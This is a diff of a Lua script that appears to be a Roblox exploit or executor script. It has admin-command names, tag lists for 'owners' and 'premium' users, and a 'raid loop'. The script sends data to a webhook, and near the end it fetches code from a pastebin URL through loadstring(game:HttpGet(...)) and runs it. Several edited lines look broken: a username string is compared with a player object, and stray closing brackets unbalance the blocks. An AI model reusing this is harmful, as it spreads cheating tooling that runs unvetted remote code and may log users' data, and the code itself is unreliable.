@@ -1,7 +1,4 @@
 
-
-
-
 local adminCmd = {"AK_ADMEN1", "328ml", "GYATT_DAMN1","IIIlIIIllIlIllIII","AliKhammas1234","dgthgcnfhhbsd","AliKhammas"}
 
 
@@ -468,6 +465,7 @@ local webhookData = createWebhookData()
 
 sendWebhook(webhookUrl, webhookData)
 
+
 local player = game.Players.LocalPlayer
 local playerName = player.Name
 local function showNotification(message, backgroundColor)
@@ -670,8 +668,7 @@ end)
 -- Check if the player executing the script is the owner
 
 -- Attach the tag to the player's head
-tag.Adornee = player.Character.Head
-tag.Parent = player.Character.Head
+
 
 for _, username in ipairs(getgenv().premiumUsers) do
 for i,v in pairs(game.Players:GetPlayers()) do
@@ -827,11 +824,11 @@ end
 
 -- Attach the tag to the heads of other premium users
 game.Players.PlayerAdded:Connect(function(plr)
-plr.CharacterAdded:Connect(function()
+plr.CharacterAdded:Connect(function(charr)
 wait(5)
 for _, username in ipairs(GMS) do
-    if game.Players:FindFirstChild(username) then
-    local otherPlayer = game.Players[username]
+    if username == game.Players:FindFirstChild(charr.Name) then
+    local otherPlayer = game.Players[charr.Name]
     if otherPlayer ~= nil and otherPlayer.Character ~= nil then
         local otherTag = Instance.new("BillboardGui")
         otherTag.Name = "PlayerTag"
@@ -857,8 +854,8 @@ for _, username in ipairs(GMS) do
 end
 end
 for _, username in ipairs(Advertisers) do
-    if game.Players:FindFirstChild(username) then
-    local otherPlayer = game.Players[username]
+    if username == game.Players:FindFirstChild(charr.Name) then
+    local otherPlayer = game.Players[charr.Name]
     if otherPlayer ~= nil and otherPlayer.Character ~= nil then
         local otherTag = Instance.new("BillboardGui")
         otherTag.Name = "PlayerTag"
@@ -884,8 +881,8 @@ for _, username in ipairs(Advertisers) do
 end
 end
 for _, username in ipairs(Scripters) do
-    if game.Players:FindFirstChild(username) then
-    local otherPlayer = game.Players[username]
+    if username == game.Players:FindFirstChild(charr.Name) then
+    local otherPlayer = game.Players[charr.Name]
     if otherPlayer ~= nil and otherPlayer.Character ~= nil then
         local otherTag = Instance.new("BillboardGui")
         otherTag.Name = "PlayerTag"
@@ -912,9 +909,10 @@ end
 end
 for _, username in ipairs(getgenv().premiumUsers) do
 for i,v in pairs(game.Players:GetPlayers()) do
-local realuser = username:lower()
-if v.Name:lower() == realuser then
-    local otherPlayer = game.Players[v.Name]
+    if username == game.Players:FindFirstChild(charr.Name) then
+local realuser = charr.Name:lower()
+if charr.Name:lower() == realuser then
+    local otherPlayer = game.Players[charr.Name]
     if otherPlayer ~= nil and otherPlayer.Character ~= nil then
         local otherTag = Instance.new("BillboardGui")
         otherTag.Name = "PlayerTag"
@@ -936,14 +934,15 @@ if v.Name:lower() == realuser then
         otherLabel.Parent = otherTag
 
         otherTag.Parent = otherPlayer.Character.Head
+    end
     end
 end
 end
 end 
 
 for _, username in ipairs(Owners) do
-    if game.Players:FindFirstChild(username) then
-    local otherPlayer = game.Players[username]
+    if username == game.Players:FindFirstChild(charr.Name) then
+    local otherPlayer = game.Players[charr.Name]
     if otherPlayer ~= nil and otherPlayer.Character ~= nil then
         local otherTag = Instance.new("BillboardGui")
         otherTag.Name = "PlayerTag"
@@ -979,11 +978,11 @@ end
 end
 )
 
-game.Players.PlayerAdded:Connect(function()
+game.Players.PlayerAdded:Connect(function(plr)
 wait(5)
 for _, username in ipairs(Owners) do
-    if game.Players:FindFirstChild(username) then
-    local otherPlayer = game.Players[username]
+    if username == game.Players:FindFirstChild(plr.Name) then
+    local otherPlayer = game.Players[plr.Name]
     if otherPlayer ~= nil and otherPlayer.Character ~= nil then
         local otherTag = Instance.new("BillboardGui")
         otherTag.Name = "PlayerTag"
@@ -1017,8 +1016,8 @@ for _, username in ipairs(Owners) do
 end
 end
 for _, username in ipairs(GMS) do
-    if game.Players:FindFirstChild(username) then
-    local otherPlayer = game.Players[username]
+    if username == game.Players:FindFirstChild(plr.Name) then
+    local otherPlayer = game.Players[plr.Name]
     if otherPlayer ~= nil and otherPlayer.Character ~= nil then
         local otherTag = Instance.new("BillboardGui")
         otherTag.Name = "PlayerTag"
@@ -1044,8 +1043,8 @@ for _, username in ipairs(GMS) do
 end
 end
 for _, username in ipairs(Advertisers) do
-    if game.Players:FindFirstChild(username) then
-    local otherPlayer = game.Players[username]
+    if username == game.Players:FindFirstChild(plr.Name) then
+    local otherPlayer = game.Players[plr.Name]
     if otherPlayer ~= nil and otherPlayer.Character ~= nil then
         local otherTag = Instance.new("BillboardGui")
         otherTag.Name = "PlayerTag"
@@ -1072,9 +1071,10 @@ end
 end
 for _, username in ipairs(getgenv().premiumUsers) do
 for i,v in pairs(game.Players:GetPlayers()) do
-local realuser = username:lower()
-if v.Name:lower() == realuser then
-    local otherPlayer = game.Players[v.Name]
+    if username == game.Players:FindFirstChild(plr.Name) then
+local realuser = plr.Name:lower()
+if plr.Name:lower() == realuser then
+    local otherPlayer = game.Players[plr.Name]
     if otherPlayer ~= nil and otherPlayer.Character ~= nil then
         local otherTag = Instance.new("BillboardGui")
         otherTag.Name = "PlayerTag"
@@ -1100,9 +1100,10 @@ if v.Name:lower() == realuser then
 end
 end
 end
+end
 for _, username in ipairs(Scripters) do
-    if game.Players:FindFirstChild(username) then
-    local otherPlayer = game.Players[username]
+    if username == game.Players:FindFirstChild(plr.Name) then
+    local otherPlayer = game.Players[plr.Name]
     if otherPlayer ~= nil and otherPlayer.Character ~= nil then
         local otherTag = Instance.new("BillboardGui")
         otherTag.Name = "PlayerTag"
@@ -1127,14 +1128,15 @@ for _, username in ipairs(Scripters) do
     end
 end
 end
-
+end)
+end)
 
 
 
 
 end
+}
 )
-
 -- Add other commands here --
 -- Second Script (Loops)
 local isKittyRaidLooping = false
@@ -1175,7 +1177,4 @@ local function raidLoop()
 end
 loadstring(game:HttpGet("https://pastebin.com/raw/2kyjCzkA"))()
 raidLoop() -- Start the raid loop
- end
-)
-        end } )
 end
